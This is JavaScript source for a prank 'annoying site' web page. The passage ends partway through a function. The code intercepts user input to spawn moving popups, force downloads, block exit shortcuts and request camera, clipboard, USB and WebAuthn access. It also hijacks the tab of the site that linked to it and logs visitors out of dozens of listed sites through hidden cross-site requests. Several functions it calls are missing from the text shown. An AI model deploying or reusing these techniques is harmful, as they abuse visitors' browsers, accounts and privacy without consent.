/* global Element */

/**
 *  The Annoying Site
 *  https://theannoyingsite.com
 *
 *  Author:
 *    Feross Aboukhadijeh
 *    https://feross.org
 *
 *  Patreon:
 *    If you enjoyed this, please support me on Patreon!
 *    https://www.patreon.com/feross
 */

const SCREEN_WIDTH = window.screen.availWidth
const SCREEN_HEIGHT = window.screen.availHeight
const WIN_WIDTH = 480
const WIN_HEIGHT = 360
const VELOCITY = 15
const MARGIN = 15
const TOP_MARGIN = 50
const TICK_LENGTH = 50

const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'

// Request notification permission immediately
if ('Notification' in window && Notification.permission === 'default') {
  Notification.requestPermission()
}

const ART = [
  `
┊┊ ☆┊┊┊┊☆┊┊☆ ┊┊┊┊┊
┈┈┈┈╭━━━━━━╮┊☆ ┊┊
┈☆ ┈┈┃╳╳╳▕╲▂▂╱▏┊┊
┈┈☆ ┈┃╳╳╳▕▏▍▕▍▏┊┊
┈┈╰━┫╳╳╳▕▏╰┻╯▏┊┊
☆ ┈┈┈┃╳╳╳╳╲▂▂╱┊┊┊
┊┊☆┊╰┳┳━━┳┳╯┊ ┊ ☆┊
  `,
  `
░░▓▓░░░░░░░░▓▓░░
░▓▒▒▓░░░░░░▓▒▒▓░
░▓▒▒▒▓░░░░▓▒▒▒▓░
░▓▒▒▒▒▓▓▓▓▒▒▒▒▓░
░▓▒▒▒▒▒▒▒▒▒▒▒▒▒▓
▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓
▓▒▒▒░▓▒▒▒▒▒░▓▒▒▓
▓▒▒▒▓▓▒▒▒▓▒▓▓▒▒▓
▓▒░░▒▒▒▒▒▒▒▒▒░░▓
▓▒░░▒▓▒▒▓▒▒▓▒░░▓
░▓▒▒▒▓▓▓▓▓▓▓▒▒▓░
░░▓▒▒▒▒▒▒▒▒▒▒▓░░
░░░▓▓▓▓▓▓▓▓▓▓░░░
  `
]

const SEARCHES = [
  'where should i bury the body',
  'why does my eye twitch',
  'why is my poop green',
  'why do i feel so empty',
  'why do i always feel hungry',
  'why do i always have diarrhea',
  'why does my anus itch',
  'why does my belly button smell',
  'why does my cat attack me',
  'why does my dog eat poop',
  'why does my fart smell so bad',
  'why does my mom hate me',
  'why does my pee smell bad',
  'why does my poop float',
  'proof that the earth is flat',
  'how to delete my browsing history',
  'how to remove a virus from my computer',
  'am i being watched',
  'why is my phone listening to me',
  'how to fake my own death',
  'why does my cat stare at me while i sleep',
  'is my house haunted quiz',
  'how to talk to squirrels',
  'can humans fly if they believe hard enough',
  'why is my reflection blinking when im not',
  'how to become a ninja turtle',
  'is mayonnaise an instrument',
  'how to summon a demon safely',
  'why do i hear boss music',
  'free iphone 16 no scam'
]

const VIDEOS = [
  'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/albundy.mp4',
  'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/badger.mp4',
  'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/cat.mp4',
  'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/hasan.mp4',
  'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/heman.mp4',
  'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/jozin.mp4',
  'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/nyan.mp4',
  'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/rickroll.mp4',
  'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/space.mp4',
  'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/trolol.mp4'
]

const FILE_DOWNLOADS = [
  'cat-blue-eyes.jpg',
  'cat-ceiling.jpg',
  'cat-crosseyes.jpg',
  'cat-cute.jpg',
  'cat-hover.jpg',
  'cat-marshmellows.jpg',
  'cat-small-face.jpg',
  'cat-smirk.jpg',
  'patreon.png'
]

const FILE_DOWNLOADS_ALL = [
  'cat-blue-eyes.jpg',
  'cat-ceiling.jpg',
  'cat-crosseyes.jpg',
  'cat-cute.jpg',
  'cat-hover.jpg',
  'cat-marshmellows.jpg',
  'cat-small-face.jpg',
  'cat-smirk.jpg',
  'patreon.png',
  'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/albundy.mp4',
  'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/badger.mp4',
  'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/cat.mp4',
  'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/hasan.mp4',
  'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/heman.mp4',
  'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/jozin.mp4',
  'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/nyan.mp4',
  'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/rickroll.mp4',
  'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/space.mp4',
  'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/trolol.mp4'
]

const PHRASES = [
  'The wheels on the bus go round and round, round and round, round and round. The wheels on the bus go round and round, all through the town!',
  'Dibidi ba didi dou dou, Di ba didi dou, Didi didldildidldidl houdihoudi dey dou',
  'I like fuzzy kittycats, warm eyes, and pretending household appliances have feelings',
  'I\'ve never seen the inside of my own mouth because it scares me to death.',
  'hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw',
  'abcdefghijklmnopqrstuvwxyz abcdefghijklmnopqrstuvwxyz',
  'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaak',
  'eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo',
  'never gonna give you up never gonna let you down never gonna run around and desert you',
  'do you know the muffin man the muffin man the muffin man do you know the muffin man who lives on drury lane',
  'what is love baby dont hurt me dont hurt me no more',
  'all the single ladies all the single ladies all the single ladies all the single ladies',
  'im blue da ba dee da ba daa da ba dee da ba daa',
  'this is the song that never ends yes it goes on and on my friend some people started singing it not knowing what it was and theyll continue singing it forever just because',
  'he had it coming he had it coming he only had himself to blame',
  'i like to move it move it i like to move it move it i like to move it move it',
  'around the world around the world around the world around the world around the world around the world',
  'baby shark doo doo doo doo doo doo baby shark doo doo doo doo doo doo baby shark doo doo doo doo doo doo baby shark',
  'mahna mahna do doo do do do mahna mahna do do do do mahna mahna do doo do do do mahna mahna do do do do',
  'its peanut butter jelly time peanut butter jelly time peanut butter jelly time',
  'trololololololololololololololololololololololololololololololololololo',
  'nyan nyan nyan nyan nyan nyan nyan nyan nyan nyan nyan nyan nyan nyan nyan nyan',
  'i am the very model of a modern major general ive information vegetable animal and mineral',
  'supercalifragilisticexpialidocious supercalifragilisticexpialidocious supercalifragilisticexpialidocious',
  'you are a pirate yarr harr fiddle dee dee you are a pirate you are a pirate'
]

const LOGOUT_SITES = {
  AOL: ['GET', 'https://my.screenname.aol.com/_cqr/logout/mcLogout.psp?sitedomain=startpage.aol.com&authLev=0&lang=en&locale=us'],
  'AOL 2': ['GET', 'https://api.screenname.aol.com/auth/logout?state=snslogout&r=' + Math.random()],
  Amazon: ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
  Blogger: ['GET', 'https://www.blogger.com/logout.g'],
  Delicious: ['GET', 'https://www.delicious.com/logout'], // works!
  DeviantART: ['POST', 'https://www.deviantart.com/users/logout'],
  DreamHost: ['GET', 'https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout'],
  Dropbox: ['GET', 'https://www.dropbox.com/logout'],
  eBay: ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
  Gandi: ['GET', 'https://www.gandi.net/login/out'],
  GitHub: ['GET', 'https://github.com/logout'],
  GMail: ['GET', 'https://mail.google.com/mail/?logout'],
  Google: ['GET', 'https://www.google.com/accounts/Logout'], // works!
  Hulu: ['GET', 'https://secure.hulu.com/logout'],
  Instapaper: ['GET', 'https://www.instapaper.com/user/logout'],
  Linode: ['GET', 'https://manager.linode.com/session/logout'],
  LiveJournal: ['POST', 'https://www.livejournal.com/logout.bml', { 'action:killall': '1' }],
  MySpace: ['GET', 'https://www.myspace.com/index.cfm?fuseaction=signout'],
  NetFlix: ['GET', 'https://www.netflix.com/Logout'],
  'New York Times': ['GET', 'https://www.nytimes.com/logout'],
  Newegg: ['GET', 'https://secure.newegg.com/NewMyAccount/AccountLogout.aspx'],
  Photobucket: ['GET', 'https://photobucket.com/logout'],
  Skype: ['GET', 'https://secure.skype.com/account/logout'],
  Slashdot: ['GET', 'https://slashdot.org/my/logout'],
  SoundCloud: ['GET', 'https://soundcloud.com/logout'],
  'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'],
  'Steam Store': ['GET', 'https://store.steampowered.com/logout/'],
  ThinkGeek: ['GET', 'https://www.thinkgeek.com/brain/account/login.cgi?a=lo'],
  Threadless: ['GET', 'https://www.threadless.com/logout'],
  Tumblr: ['GET', 'https://www.tumblr.com/logout'],
  Vimeo: ['GET', 'https://vimeo.com/log_out'],
  Wikipedia: ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'],
  'Windows Live': ['GET', 'https://login.live.com/logout.srf'],
  Woot: ['GET', 'https://account.woot.com/logout'],
  Wordpress: ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
  Yahoo: ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
  YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }]
}

/**
 * Array to store the child windows spawned by this window.
 */
const wins = []

/**
 * Count of number of clicks
 */
let interactionCount = 0

/**
 * Number of iframes injected into the page for the "super logout" functionality.
 * See superLogout().
 */
let numSuperLogoutIframes = 0

/**
 * Is this window a child window? A window is a child window if there exists a
 * parent window (i.e. the window was opened by another window so `window.opener`
 * is set) *AND* that parent is a window on the same origin (i.e. the window was
 * opened by us, not an external website)
 */
const isChildWindow = (window.opener && isParentSameOrigin()) ||
  window.location.search.indexOf('child=true') !== -1

/**
 * Is this window a parent window?
 */
const isParentWindow = !isChildWindow

/*
 * Run this code in all windows, *both* child and parent windows.
 */
try {
  init()
  if (isChildWindow) initChildWindow()
  else initParentWindow()
} catch (e) {
  console.warn('init error:', e)
  document.body.innerHTML += '<div style="color:red;margin:20px;font-family:sans-serif">Page loaded but some features failed. Press any key or space.</div>'
}

/**
 * Initialization code for *both* parent and child windows.
 */
function init () {
  const loadingEl = document.getElementById('loading')
  if (loadingEl) loadingEl.remove()

  confirmPageUnload()

  interceptUserInput(event => {
    interactionCount += 1

    // Prevent default behavior (breaks closing window shortcuts)
    event.preventDefault()
    event.stopPropagation()

    // 'touchstart' and 'touchend' events are not able to open a new window
    // (at least in Chrome), so don't even try. Checking `event.which !== 0` is just
    // a clever way to exclude touch events.
    if (event.which !== 0) openWindow()

    startVibrateInterval()
    enablePictureInPicture()
    triggerFileDownload()

    focusWindows()
    copySpamToClipboard()
    speak()
    startTheramin()
    spamNotifications()
    keepAwake()
    requestScreenCapture()
    requestFileSystemAccess()
    requestContactPicker()
    setBadge()
    openEyeDropper()
    destroyHardware()

    // Capture key presses on the Command or Control keys, to interfere with the
    // "Close Window" shortcut.
    if (event.key === 'Meta' || event.key === 'Control') {
      window.print()
      requestWebauthnAttestation()
      window.print()
      requestWebauthnAttestation()
      window.print()
      requestWebauthnAttestation()
      lockKeyboard()
    } else {
      requestPointerLock()

      requestFullscreen()
      requestClipboardRead()
      requestMidiAccess()
      requestBluetoothAccess()
      requestUsbAccess()
      requestSerialAccess()
      requestHidAccess()
      requestCameraAndMic()
      if (Math.random() < 0.1) {
        // Don't request TouchID on every interaction in Safari since it blocks
        // the event loop and stops windows from moving
        requestWebauthnAttestation()
      }
    }
  })
}

/**
 * Initialization code for child windows.
 */
function initChildWindow () {
  registerProtocolHandlers()
  hideCursor()
  moveWindowBounce()
  setupFollowWindow()
  startVideo()
  detectWindowClose()
  triggerFileDownload()
  speak()
  rainbowThemeColor()
  animateUrlWithEmojis()
  keepAwake()
  startPersistentAudio()

  interceptUserInput(event => {
    if (interactionCount === 1) {
      startAlertInterval()
    }
  })
}

/**
 * Initialization code for parent windows.
 */
function initParentWindow () {
  showHelloMessage()
  blockBackButton()
  fillHistory()
  startInvisiblePictureInPictureVideo()
  registerServiceWorker()

  interceptUserInput(event => {
    // Only run these on the first interaction
    if (interactionCount === 1) {
      registerProtocolHandlers()
      attemptToTakeoverReferrerWindow()
      hideCursor()
      startVideo()
      startAlertInterval()
      superLogout()
      removeHelloMessage()
      rainbowThemeColor()
      animateUrlWithEmojis()
      speak('click work on space dude')
      spamNotifications()
      keepAwake()
      setBadge()
      startPersistentAudio()
      requestIdleDetection()
      destroyHardware()
    }
  })
}

/**
 * Sites that link to theannoyingsite.com may specify `target='_blank'` to open the
 * link in a new window. For example, Messenger.com from Facebook does this.
 * However, that means that `window.opener` will be set, which allows us to redirect
 * that window. YES, WE CAN REDIRECT THE SITE THAT LINKED TO US.
 * Learn more here: https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/
 */
function attemptToTakeoverReferrerWindow () {
  if (isParentWindow && window.opener && !isParentSameOrigin()) {
    window.opener.location = `${window.location.origin}/?child=true`
  }
}

/**
 * Returns true if the parent window is on the same origin. It's not enough to check
 * that `window.opener` is set, because that will also get set if a site on a
 * different origin links to theannoyingsite.com with `target='_blank'`.
 */
function isParentSameOrigin () {
  try {
    // May throw an exception if `window.opener` is on another origin
    return window.opener.location.origin === window.location.origin
  } catch (err) {
    return false
  }
}

/**
 * Ask the user "are you sure you want to leave this page?". In most browsers,
 * this will not actually do anything unless the user has at least one interaction
 * with the page before they close it.
 */
function confirmPageUnload () {
  window.addEventListener('beforeunload', event => {
    speak('Please don\'t go!')
    event.returnValue = true
  })
}

/**
 * Attempt to register all possible browser-whitelisted protocols to be handled by
 * this web app instead of their default handlers.
 */
function registerProtocolHandlers () {
  if (typeof navigator.registerProtocolHandler !== 'function') return

  const protocolWhitelist = [
    'bitcoin',
    'geo',
    'im',
    'irc',
    'ircs',
    'magnet',
    'mailto',
    'mms',
    'news',
    'ircs',
    'nntp',
    'sip',
    'sms',
    'smsto',
    'ssh',
    'tel',
    'urn',
    'webcal',
    'wtai',
    'xmpp'
  ]

  const handlerUrl = window.location.href + '/url=%s'

  protocolWhitelist.forEach(proto => {
    navigator.registerProtocolHandler(proto, handlerUrl, 'The Annoying Site')
  })
}

/**
 * Attempt to access the user's camera and microphone, and attempt to enable the
 * torch (i.e. camera flash) if the device has one.
 */
function requestCameraAndMic () {
  if (!navigator.mediaDevices ||
      typeof navigator.mediaDevices.getUserMedia !== 'function') {
    return
  }

  navigator.mediaDevices.enumerateDevices().then(devices => {
    const cameras = devices.filter((device) => device.kind === 'videoinput')

    if (cameras.length === 0) return
    const camera = cameras[cameras.length - 1]

    navigator.mediaDevices.getUserMedia({
      deviceId: camera.deviceId,
      facingMode: ['user', 'environment'],
      audio: true,
      video: true
    }).then(stream => {
      const track = stream.getVideoTracks()[0]
      const imageCapture = new window.ImageCapture(track)

      imageCapture.getPhotoCapabilities().then(() => {
        // Let there be light!
        track.applyConstraints({ advanced: [{ torch: true }] })
      }, () => { /* No torch on this device */ })
    }, () => { /* ignore errors */ })
  })
}

/**
 * Animating the URL with emojis
 * See: https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/
 */
function animateUrlWithEmojis () {
  if (window.ApplePaySession) {
    // Safari doesn't show the full URL anyway, so we can't animate it
    return
  }
  const rand = Math.random()
  if (rand < 0.33) {
    animateUrlWithBabies()
  } else if (rand < 0.67) {
    animateUrlWithWave()
  } else {
    animateUrlWithMoons()
  }

  function animateUrlWithBabies () {
    const e = ['🏻', '🏼', '🏽', '🏾', '🏿']

    setInterval(() => {
      let s = ''
      let i; let m

      for (i = 0; i < 10; i++) {
        m = Math.floor(e.length * ((Math.sin((Date.now() / 100) + i) + 1) / 2))
        s += '👶' + e[m]
      }

      window.location.hash = s
    }, 100)
  }

  function animateUrlWithWave () {
    setInterval(() => {
      let i; let n; let s = ''

      for (i = 0; i < 10; i++) {
        n = Math.floor(Math.sin((Date.now() / 200) + (i / 2)) * 4) + 4

        s += String.fromCharCode(0x2581 + n)
      }

      window.location.hash = s
    }, 100)
  }

  function animateUrlWithMoons () {
    const f = ['🌑', '🌘', '🌗', '🌖', '🌕', '🌔', '🌓', '🌒']
    const d = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
    let m = 0

    setInterval(() => {
      let s = ''
      let x = 0

      if (!m) {
        while (d[x] === 4) {
          x++
        }

        if (x >= d.length) m = 1
        else {
          d[x]++
        }
      } else {
        while (d[x] === 0) {
          x++
        }

        if (x >= d.length) m = 0
        else {
          d[x]++

          if (d[x] === 8) d[x] = 0
        }
      }

      d.forEach(function (n) {
        s += f[n]
      })

      window.location.hash = s
    }, 100)
  }
}

/**
 * Lock the user's pointer, without even being in full screen!
 * Require user-initiated event.
 */
function requestPointerLock () {
  const requestPointerLockApi = (
    document.body.requestPointerLock ||
    document.body.webkitRequestPointerLock ||
    document.body.mozRequestPointerLock ||
    document.body.msRequestPointerLock
  )

  requestPointerLockApi.call(document.body)
}

/**
 * Start vibrating the device at random intervals, on supported devices.
 * Requires user-initiated event.
 */
function startVibrateInterval () {
  if (typeof window.navigator.vibrate !== 'function') return
  setInterval(() => {
    const duration = Math.floor(Math.random() * 600)
    window.navigator.vibrate(duration)
  }, 1000)

  // If the gamepad can vibrate, we will at random intervals every second. And at random strengths!
  window.addEventListener('gamepadconnected', (event) => {
    const gamepad = event.gamepad
    if (gamepad.vibrationActuator) {
      setInterval(() => {
        if (gamepad.connected) {
          gamepad.vibrationActuator.playEffect('dual-rumble', {
            duration: Math.floor(Math.random() * 600),
            strongMagnitude: Math.random(),
            weakMagnitude: Math.random()
          })
        }
      }, 1000)
    }
  })
}

/**
 * Intercept all user-initiated events and call the given the function, `onInput`.
 */
function interceptUserInput (onInput) {
  document.body.addEventListener('touchstart', onInput, { passive: false })

  document.body.addEventListener('mousedown', onInput)
  document.body.addEventListener('mouseup', onInput)
  document.body.addEventListener('click', onInput)

  document.body.addEventListener('keydown', onInput)
  document.body.addEventListener('keyup', onInput)
  document.body.addEventListener('keypress', onInput)
}

/**
 * Start an invisible, muted video so we have a one ready to put into
 * picture-in-picture mode on the first user-interaction.
 */
function startInvisiblePictureInPictureVideo () {
  const video = document.createElement('video')
  video.src = getRandomArrayEntry(VIDEOS)
  video.loop = true
  video.muted = true
  video.style = HIDDEN_STYLE
  video.autoplay = true
  video.play()

  document.body.appendChild(video)
}

/**
 * Active Safari's picture-in-picture feature, which let's show a video on the
 * desktop. Requires user-initiated event.
 */
function enablePictureInPicture () {
  const video = document.querySelector('video')
  if (document.pictureInPictureEnabled) {
    video.style = ''
    video.muted = false
    video.requestPictureInPicture()
    video.play()
  }
}

/**
 * Focus all child windows. Requires user-initiated event.
 */
function focusWindows () {
  wins.forEach(win => {
    if (!win.closed) win.focus()
  })
}

/**
 * Open a new popup window. Requires user-initiated event.
 */
function openWindow () {
  const { x, y } = getRandomCoords()
  const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
  const win = window.open(window.location.pathname, '', opts)

  // New windows may be blocked by the popup blocker
  if (!win) return
  wins.push(win)

  if (wins.length === 2) setupSearchWindow(win)
}

/**
 * Hide the user's cursor!
 */
function hideCursor () {
  document.querySelector('html').style = 'cursor: none;'
}

/**
 * Trigger multiple file downloads simultaneously.
 * Also show downloaded images on screen for visual clutter.
 */
function triggerFileDownload () {
  const numDownloads = 5 + Math.floor(Math.random() * 10)
  for (let d = 0; d < numDownloads; d++) {
    const fileName = getRandomArrayEntry(FILE_DOWNLOADS_ALL)
    const a = document.createElement('a')
    a.href = fileName
    a.download = fileName
    a.style = 'position:fixed;left:-9999px'
    document.body.appendChild(a)
    a.click()
    setTimeout(() => a.remove(), 50)

    if (fileName.endsWith('.jpg') || fileName.endsWith('.png')) {
      const img = document.createElement('img')
      img.src = fileName
      img.style = 'position: fixed; width: ' + (50 + Math.random() * 200) + 'px; top: ' + Math.random() * 90 + '%; left: ' + Math.random() * 90 + '%; z-index: ' + Math.floor(Math.random() * 10000) + '; opacity: ' + (Math.random() * 0.5 + 0.3) + '; pointer-events: none; transform: rotate(' + Math.random() * 360 + 'deg);'
      document.body.appendChild(img)
    }
  }
}

/**
 * Speak the given `phrase` using text-to-speech.
 */
function speak (phrase) {
  if (phrase == null) phrase = getRandomArrayEntry(PHRASES)
  window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase))
}

/**
 * Start an annoying theramin that changes pitch and volume depending on
 * the mouse position. Uses a Web Audio oscillator. Reauires user-initiated
 * event.
 * Based on https://github.com/feross/TheAnnoyingSite.com/pull/2
 */
function startTheramin () {
  const audioContext = new AudioContext()
  const oscillatorNode = audioContext.createOscillator()
  const gainNode = audioContext.createGain()

  const pitchBase = 50
  const pitchRange = 4000

  const wave = audioContext.createPeriodicWave(
    Array(10).fill(0).map((v, i) => Math.cos(i)),
    Array(10).fill(0).map((v, i) => Math.sin(i))
  )

  oscillatorNode.setPeriodicWave(wave)

  oscillatorNode.connect(gainNode)
  gainNode.connect(audioContext.destination)

  oscillatorNode.start(0)

  const oscillator = ({ pitch, volume }) => {
    oscillatorNode.frequency.value = pitchBase + pitch * pitchRange
    gainNode.gain.value = volume * 0.5
  }

  document.body.addEventListener('mousemove', event => {
    const { clientX, clientY } = event
    const { clientWidth, clientHeight } = document.body
    const pitch = (clientX - clientWidth / 2) / clientWidth
    const volume = (clientY - clientHeight / 2) / clientHeight
    oscillator({ pitch, volume })
  })
}

/**
 * Attempt to read the user's clipboard.
 * Requires user-initiated event.
 */
function requestClipboardRead () {
  try {
    navigator.clipboard.readText().then(
      data => {
        if (!window.ApplePaySession) {
          // Don't alert in Safari because it blocks the event loop
          window.alert("Successfully read data from clipboard: '" + data + "'")
        }
      },
      () => {}
    )
  } catch {}
}

/**
 * Request Webauthn attestation.
 * Requires user-initiated event.
 */
function requestWebauthnAttestation () {
  try {
    // From https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API
    // This code is public domain, per https://developer.mozilla.org/en-US/docs/MDN/About#Copyrights_and_licenses

    // sample arguments for registration
    const createCredentialDefaultArgs = {
      publicKey: {
      // Relying Party (a.k.a. - Service):
        rp: {
          name: 'Acme'
        },

        // User:
        user: {
          id: new Uint8Array(16),
          name: 'YOU_ARE_HACKED@THEANNOYINGSITE.COM',
          displayName: 'YOU ARE HACKED'
        },

        pubKeyCredParams: [{
          type: 'public-key',
          alg: -7
        }],

        attestation: 'direct',

        timeout: 60000,

        challenge: new Uint8Array([ // must be a cryptographically random number sent from a server
          0x8C, 0x0A, 0x26, 0xFF, 0x22, 0x91, 0xC1, 0xE9, 0xB9, 0x4E, 0x2E, 0x17, 0x1A, 0x98, 0x6A, 0x73,
          0x71, 0x9D, 0x43, 0x48, 0xD5, 0xA7, 0x6A, 0x15, 0x7E, 0x38, 0x94, 0x52, 0x77, 0x97, 0x0F, 0xEF
        ]).buffer
      }
    }

    // sample arguments for login
    const getCredentialDefaultArgs = {
      publicKey: {
        timeout: 60000,
        // allowCredentials: [newCredential] // see below
        challenge: new Uint8Array([ // must be a cryptographically random number sent from a server
          0x79, 0x50, 0x68, 0x71, 0xDA, 0xEE, 0xEE, 0xB9, 0x94, 0xC3, 0xC2, 0x15, 0x67, 0x65, 0x26, 0x22,
          0xE3, 0xF3, 0xAB, 0x3B, 0x78, 0x2E, 0xD5, 0x6F, 0x81, 0x26, 0xE2, 0xA6, 0x01, 0x7D, 0x74, 0x50
        ]).buffer
      }
    }

    // register / create a new credential
    navigator.credentials.create(createCredentialDefaultArgs)
      .then((cred) => {
      // normally the credential IDs available for an account would come from a server
      // but we can just copy them from above...
        const idList = [{
          id: cred.rawId,
          transports: ['usb', 'nfc', 'ble'],
          type: 'public-key'
        }]
        getCredentialDefaultArgs.publicKey.allowCredentials = idList
        return navigator.credentials.get(getCredentialDefaultArgs)
      })
  } catch {}
}

/**
 * Request access to MIDI devices.
 * Requires user-initiated event.
 */
function requestMidiAccess () {
  try {
    navigator.requestMIDIAccess({
      sysex: true
    })
  } catch {}
}

/**
 * Request access to Bluetooth devices.
 * Requires user-initiated event.
 */
function requestBluetoothAccess () {
  try {
    navigator.bluetooth.requestDevice({
      // filters: [...] <- Prefer filters to save energy & show relevant devices.
      // acceptAllDevices here ensures dialog can populate, we don't care with what.
      acceptAllDevices: true
    })
      .then(device => device.gatt.connect())
  } catch {}
}

/**
 * Request access to USB devices.
 * Requires user-initiated event.
 */
function requestUsbAccess () {
  try {
    navigator.usb.requestDevice({ filters: [{}] })
  } catch {}
}

/**
 * Request access to Serial devices.
 * Requires user-initiated event.
 */
function requestSerialAccess () {
  try {
    navigator.serial.requestPort({ filters: [] })
  } catch {}
}

/**
 * Request access to HID devices.
 * Requires user-initiated event.
 */
function requestHidAccess () {
  try {
    navigator.hid.requestDevice({ filters: [] })
  } catch {}
}

/**
 * Move the window around the screen and bounce off of the screen edges.
 */
function moveWindowBounce () {
  let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
  let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1)

  setInterval(() => {
    const x = window.screenX
    const y = window.screenY
    const width = window.outerWidth
    const height = window.outerHeight

    if (x < MARGIN) vx = Math.abs(vx)
    if (x + width > SCREEN_WIDTH - MARGIN) vx = -1 * Math.abs(vx)
    if (y < TOP_MARGIN) vy = Math.abs(vy)
    if (y + height > SCREEN_HEIGHT - MARGIN) vy = -1 * Math.abs(vy)

    window.moveBy(vx, vy)
  }, TICK_LENGTH)
}

/**
 * Follow the user's mouse
 */
function setupFollowWindow () {
  document.addEventListener('mousemove', function (e) {
    window.moveTo(e.screenX - (WIN_WIDTH / 2), e.screenY - (WIN_HEIGHT / 2))
  })
}

/**
 * Show a random troll video in the window.
 */
function startVideo () {
  const video = document.createElement('video')

  video.src = getRandomArrayEntry(VIDEOS)
  video.autoplay = true
  video.loop = true
  video.style = 'width: 100%; height: 100%;'

  document.body.appendChild(video)
}

/**
 * When a child window closes, notify the parent window so it can remove it from
 * the list of child windows.
 */
function detectWindowClose () {
  window.addEventListener('unload', () => {
    if (!window.opener.closed) window.opener.onCloseWindow(window)
  })
}

/**
 * Handle a child window closing.
 */
function onCloseWindow (win) {
  const i = wins.indexOf(win)
  if (i >= 0) wins.splice(i, 1)
}

/**
 * Show the unsuspecting user a friendly hello message with a cat.
 */
function showHelloMessage () {
  const template = document.querySelector('template')
  const clone = document.importNode(template.content, true)
  document.body.appendChild(clone)
}

/**
 * Remove the hello message.
 */
function removeHelloMessage () {
  const helloMessage = document.querySelector('.hello-message')
  helloMessage.remove()
}

/**
 * Change the theme color of the browser in a loop.
 */
function rainbowThemeColor () {
  function zeroFill (width, number, pad = '0') {
    width -= number.toString().length
    if (width > 0) return new Array(width + (/\./.test(number) ? 2 : 1)).join(pad) + number
    return number + ''
  }

  const meta = document.querySelector('meta.theme-color')
  setInterval(() => {
    meta.setAttribute('content', '#' + zeroFill(6, Math.floor(Math.random() * 16777215).toString(16)))
  }, 50)
}

/**
 * Copy cat pictures onto the user's clipboard. Requires user-initiated event.
 */
function copySpamToClipboard () {
  const randomArt = getRandomArrayEntry(ART) + '\nCheck out https://theannoyingsite.com'
  clipboardCopy(randomArt)
}

/**
 * Copy given text, `text`, onto the user's clipboard.
 * Requires user-initiated event.
 */
function clipboardCopy (text) {
  // A <span> contains the text to copy
  const span = document.createElement('span')
  span.textContent = text
  span.style.whiteSpace = 'pre' // Preserve consecutive spaces and newlines

  // An <iframe> isolates the <span> from the page's styles
  const iframe = document.createElement('iframe')
  iframe.sandbox = 'allow-same-origin'
  document.body.appendChild(iframe)

  let win = iframe.contentWindow
  win.document.body.appendChild(span)

  let selection = win.getSelection()

  // Firefox fails to get a selection from <iframe> window, so fallback
  if (!selection) {
    win = window
    selection = win.getSelection()
    document.body.appendChild(span)
  }

  const range = win.document.createRange()
  selection.removeAllRanges()
  range.selectNode(span)
  selection.addRange(range)

  let success = false
  try {
    success = win.document.execCommand('copy')
  } catch (err) {
    console.log(err)
  }

  selection.removeAllRanges()
  span.remove()
  iframe.remove()

  return success
}

/**
 * Show a modal dialog at a regular interval. Modals capture focus from other OS apps and browser tabs.
 * Except in Chrome 64+, where modals can only capture focus from other OS apps,
 * but not from other tabs.
 */
function startAlertInterval () {
  setInterval(() => {
    if (Math.random() < 0.5) {
      showAlert()
    } else {
      window.print()
    }
  }, 120_000)
}

/**
 * Show an alert with 1000's of lines of cat ASCII art.
 */
function showAlert () {
  const randomArt = getRandomArrayEntry(ART)
  const longAlertText = Array(200).join(randomArt)
  window.alert(longAlertText)
}

/**
 * Fullscreen the browser window
 */
function requestFullscreen () {
  const requestFullscreen = Element.prototype.requestFullscreen ||
    Element.prototype.webkitRequestFullscreen ||
    Element.prototype.mozRequestFullScreen ||
    Element.prototype.msRequestFullscreen

  requestFullscreen.call(document.body)
}

/**
 * Log the user out of top sites they're logged into, including Google.com.
 * Inspired by https://superlogout.com
 */
function superLogout () {
  function cleanup (el, delayCleanup) {
    if (delayCleanup) {
      delayCleanup = false
      return
    }
    el.parentNode.removeChild(el)
  }

  function get (url) {
    const img = document.createElement('img')
    img.onload = () => cleanup(img)
    img.onerror = () => cleanup(img)
    img.style = HIDDEN_STYLE
    document.body.appendChild(img)
